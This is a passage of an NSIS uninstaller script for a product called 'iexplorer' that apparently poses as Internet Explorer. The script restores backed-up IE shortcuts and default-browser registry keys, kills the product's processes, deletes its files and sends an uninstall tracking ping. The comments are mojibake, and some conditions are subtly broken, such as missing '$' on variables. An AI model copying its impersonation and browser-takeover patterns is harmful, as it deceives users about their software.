			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b true, t '$SMPROGRAMS\Internet.lnk')"
			Goto ReStoreOK
			IfFileExists "$0\IECFG\lnkbak\SMPROGRAMS_���� Internet Explorer �����.lnk" 0 +3
			CopyFiles /silent "$0\IECFG\lnkbak\SMPROGRAMS_���� Internet Explorer �����.lnk" "$SMPROGRAMS\���� Internet Explorer �����.lnk"
			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b true, t '$SMPROGRAMS\���� Internet Explorer �����.lnk')"
			ReStoreOK:
		${EndIf}
		${If} $R8 == "1" 
			;CreateShortCut "$STARTMENU\Internet Explorer.lnk" "$R5" "" "" "" "" "" "���� Internet Explorer �����" 
			IfFileExists "$0\IECFG\lnkbak\STARTMENU_Internet Explorer.lnk" 0 +3
			CopyFiles /silent "$0\IECFG\lnkbak\STARTMENU_Internet Explorer.lnk" "$STARTMENU\Internet Explorer.lnk"
			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b true, t '$STARTMENU\Internet Explorer.lnk')"
			Goto ReStoreOK1
			IfFileExists "$0\IECFG\lnkbak\STARTMENU_Internet.lnk" 0 +3
			CopyFiles /silent "$0\IECFG\lnkbak\STARTMENU_Internet.lnk" "$STARTMENU\Internet.lnk"
			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b true, t '$STARTMENU\Internet.lnk')"
			Goto ReStoreOK1
			IfFileExists "$0\IECFG\lnkbak\STARTMENU_���� Internet Explorer �����.lnk" 0 +3
			CopyFiles /silent "$0\IECFG\lnkbak\STARTMENU_���� Internet Explorer �����.lnk" "$STARTMENU\���� Internet Explorer �����.lnk"
			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b true, t '$STARTMENU\���� Internet Explorer �����.lnk')"
			ReStoreOK1:
		${EndIf}
	${EndIf}
	;${If} $R7 == "1" 
	;	IfFileExists "$0\IECFG\lnkbak\SMPROGRAMS_Internet Explorer.lnk" 0 +2
	;	CopyFiles /silent "$0\IECFG\lnkbak\SMPROGRAMS_Internet Explorer.lnk" "$SMPROGRAMS\Internet Explorer.lnk"
	;${EndIf}
	${If} $R9 == "1" 
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::HideIEIcon(i 0)"
	${EndIf}
	${If} $9 == "1" 
		;CreateShortCut "$DESKTOP\Internet Explorer.lnk" "$R5" "" "" "" "" "" "���� Internet Explorer �����"
		IfFileExists "$0\IECFG\lnkbak\DESKTOP_Internet Explorer.lnk" 0 +2
		CopyFiles /silent "$0\IECFG\lnkbak\DESKTOP_Internet Explorer.lnk" "$DESKTOP\Internet Explorer.lnk"
	${EndIf}
	;��ԭ���5
	StrCpy $8 ""
	ReadRegStr $8 HKCU "SOFTWARE\iexplorer" "StartMenuInternet"
	ReadRegStr $7 HKCU "Software\Clients\StartMenuInternet\IEXPLORE.EXE\shell\open\command" ""
	ReadRegStr $6 HKLM "Software\Clients\StartMenuInternet\IEXPLORE.EXE\shell\open\command" ""
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'HKCU\VAUE=$7, StartMenuInternetBAK=$8, HKLM\VAUE=$6')"
	${If} $8 != ""
			${If} $6 != ""
				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t '2HKCU\VAUE=$7, StartMenuInternetBAK=$8, HKLM\VAUE=$6')"
				WriteRegStr HKLM "Software\Clients\StartMenuInternet\IEXPLORE.EXE\shell\open\command" "" "$8"
			${EndIf}
			${If} $7 != ""
				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t '3HKCU\VAUE=$7, StartMenuInternetBAK=$8, HKLM\VAUE=$6')"
				WriteRegStr HKCU "Software\Clients\StartMenuInternet\IEXPLORE.EXE\shell\open\command" "" "$8"
			${EndIf}
	${EndIf}
	;ɾ������
	RMDir /r $0\IECFG\lnkbak
	;��ԭ����ͼ��
	Var /GLOBAL strNoAddOns
	Var /GLOBAL strOpenHomePage
	StrCpy $strNoAddOns ""
	StrCpy $strOpenHomePage ""
	ReadRegStr $strNoAddOns HKCU "SOFTWARE\iexplorer" "HideIEIcon_NoAddOns"
	ReadRegStr $strOpenHomePage HKCU "SOFTWARE\iexplorer" "HideIEIcon_OpenHomePage"
	${If} $strNoAddOns != ""
		WriteRegStr HKCR "CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\NoAddOns\Command" "" "$strNoAddOns"
	${EndIf}
	${If} $strOpenHomePage != ""
		WriteRegStr HKCR "CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command" "" "$strOpenHomePage"
	${EndIf}
	;��ԭĬ�������
	Var /GLOBAL strDefaultBrowser1
	Var /GLOBAL strDefaultBrowser2
	StrCpy $strDefaultBrowser1 ""
	StrCpy $strDefaultBrowser2 ""
	ReadRegStr $strDefaultBrowser1 HKCU "SOFTWARE\iexplorer" "HKCRAppIE"
	ReadRegStr $strDefaultBrowser2 HKCU "SOFTWARE\iexplorer" "HKCRHttp"
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'strDefaultBrowser1 = $strDefaultBrowser1, strDefaultBrowser2 = $strDefaultBrowser2')"
	${If} $strDefaultBrowser1 != ""
		Var /GLOBAL strDefaultOld
		StrCpy $strDefaultOld ""
		ReadRegStr $strDefaultOld HKCR "Applications\iexplore.exe\shell\open\command" ""
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'strDefaultOld = $strDefaultOld')"
		${If} strDefaultOld != ""
			${WordReplace} $strDefaultOld  "$0\iexplorer\program\iexplore.exe" "" "+" $R0
			${If} $R0 != $strDefaultOld
				WriteRegStr HKCR "Applications\iexplore.exe\shell\open\command" "" $strDefaultBrowser1
			${EndIf}
		${EndIf}
	${EndIf}
	${If} $strDefaultBrowser2 != ""
		Var /GLOBAL strDefaultOld2
		StrCpy $strDefaultOld2 ""
		ReadRegStr $strDefaultOld2 HKCR "http\shell\open\command" ""
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'strDefaultOld2 = $strDefaultOld2')"
		${If} strDefaultOld2 != ""
			${WordReplace} $strDefaultOld2  "$0\iexplorer\program\iexplore.exe" "" "+" $R0
			${If} $R0 != $strDefaultOld2
				WriteRegStr HKCR "http\shell\open\command" "" $strDefaultBrowser2
			${EndIf}
		${EndIf}
	${EndIf}
FunctionEnd

Function un.onInit
	System::Call "kernel32::CreateMutexA(i 0, i 0, t 'iesetup_{113CFDBC-6426-4b1a-9539-24ADF327AC93}') i .r1 ?e"
	Pop $R0
	StrCmp $R0 0 +2
	Abort
	
	IfFileExists "$INSTDIR\program\Microsoft.VC90.CRT.manifest" 0 InitFailed
	CopyFiles /silent "$INSTDIR\program\Microsoft.VC90.CRT.manifest" "$TEMP\${PRODUCT_NAME}\"
	IfFileExists "$INSTDIR\program\msvcp90.dll" 0 InitFailed
	CopyFiles /silent "$INSTDIR\program\msvcp90.dll" "$TEMP\${PRODUCT_NAME}\"
	IfFileExists "$INSTDIR\program\msvcr90.dll" 0 InitFailed
	CopyFiles /silent "$INSTDIR\program\msvcr90.dll" "$TEMP\${PRODUCT_NAME}\"
	IfFileExists "$INSTDIR\program\ATL90.dll" 0 InitFailed
	CopyFiles /silent "$INSTDIR\program\ATL90.dll" "$TEMP\${PRODUCT_NAME}\"
	IfFileExists "$INSTDIR\program\Microsoft.VC90.ATL.manifest" 0 InitFailed
	CopyFiles /silent "$INSTDIR\program\Microsoft.VC90.ATL.manifest" "$TEMP\${PRODUCT_NAME}\"
	Goto +2
	InitFailed:
	Abort
	Call un.UpdateChanel
	SetOutPath "$TEMP\${PRODUCT_NAME}"
	SetOverwrite on
	File "bin\YBSetUpHelper.dll"
	;ɱ����
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::KillMyIExplorer()"
	Sleep 500
	;�ж��Ƿ�ɱ��ȫ
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::QueryMyExplorerExist() i.R1"
	${If} $R1 == 1
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'the process of my explore is not kill all')"
		Abort
	${EndIf}
	
	;ɾ��ͼ��
	Call un.DeleteIcon
	;ˢ��ͼ��
	System::Call "shell32.dll::SHChangeNotify(l, l, i, i) v (0x08000000, 0, 0, 0)"
	Sleep 1000
	;ɾ���ļ����򵥴ֱ���
	RMDir /r "$INSTDIR"
	StrCpy $R0 ""
	ReadRegStr $R0 HKCU "Software\iexplorer" "ietid"
	${If} $R0 == ""
		StrCpy $R0 "UA-61921868-1"
	${EndIf}
	;�ϱ�
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'uninstall', t '$str_ChannelID', t '${VERSION_LASTNUMBER}', i 1, t '$R0') "
	;ɾ������ע���
	DeleteRegKey HKCU "SOFTWARE\${PRODUCT_NAME}"
	;ɾ��ͨ��ע���
	DeleteRegKey HKLM "Software\Microsoft\Windows\CurrentVersion\App Paths\iexplorer.exe"
	DeleteRegKey HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe"
	DeleteRegValue HKCU "Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BROWSER_EMULATION" "iexplorer.exe"
	
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SoftExit() ? u"
	Abort
FunctionEnd